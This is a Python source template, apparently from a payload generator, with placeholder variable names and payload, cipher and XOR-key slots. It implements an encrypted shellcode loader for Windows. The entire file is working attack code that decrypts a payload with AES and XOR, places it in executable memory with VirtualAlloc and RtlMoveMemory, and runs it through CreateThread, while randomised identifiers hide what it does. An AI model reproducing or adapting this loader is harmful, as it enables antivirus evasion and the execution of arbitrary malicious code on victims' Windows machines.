from ctypes import c_int as ---VAR1---
import ctypes as ---VAR25---
from ctypes import pointer as ---VAR5---
from ctypes import c_char as ---VAR6---
import hashlib as ---VAR2---
from Crypto.Cipher import AES as ---VAR3---
from base64 import b64decode as ---VAR7---
from binascii import unhexlify as ---VAR8---
from itertools import cycle as ---VAR9---
from itertools import izip as ---VAR10---

---VAR4--- = lambda s,p : s[0:-ord(s[-1])]

---VAR11--- = '---CIPHER---'

def ---VAR12---(---VAR13---,---VAR14---):
	return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in ---VAR10---(list(---VAR7---(---VAR13---)),---VAR9---(---VAR14---)))

class ---VAR16---:
    def __init__(self, ---VAR17---):
        self.---VAR18--- = ---VAR2---.sha256(---VAR17---.encode('utf8')).digest()
        self.bs = ---VAR3---.block_size

    def ---VAR19---(self, ---VAR21---):
        ---VAR22--- = ---VAR7---(---VAR21---)
        self.---VAR20--- = ---VAR3---.new(self.---VAR18---, ---VAR3---.MODE_CBC, ---VAR22---[:---VAR3---.block_size])
        return ---VAR4---(self.---VAR20---.decrypt(---VAR22---[---VAR3---.block_size:]), ---VAR3---.block_size)

---VAR23--- = '---PAYLOAD---'
---VAR24--- = ---VAR16---(---VAR11---)
---VAR15--- = '---XORKEY---'
---VAR26--- = bytearray(---VAR8---(---VAR12---(---VAR24---.---VAR19---(---VAR23---),---VAR15---)[::-1]))

---VAR27--- = ---VAR25---.windll.kernel32.VirtualAlloc(---VAR1---(0), ---VAR1---(len(---VAR26---)), ---VAR1---(0x3000), ---VAR1---(0x40))

---VAR28--- = (---VAR6--- * len(---VAR26---)).from_buffer(---VAR26---)

---VAR25---.windll.kernel32.RtlMoveMemory(---VAR1---(---VAR27---), ---VAR28---, ---VAR1---(len(---VAR26---)))

---VAR29--- = ---VAR25---.windll.kernel32.CreateThread(---VAR1---(0), ---VAR1---(0), ---VAR1---(---VAR27---), ---VAR1---(0), ---VAR1---(0), ---VAR5---(---VAR1---(0)))

---VAR25---.windll.kernel32.WaitForSingleObject(---VAR1---(---VAR29---), ---VAR1---(-1))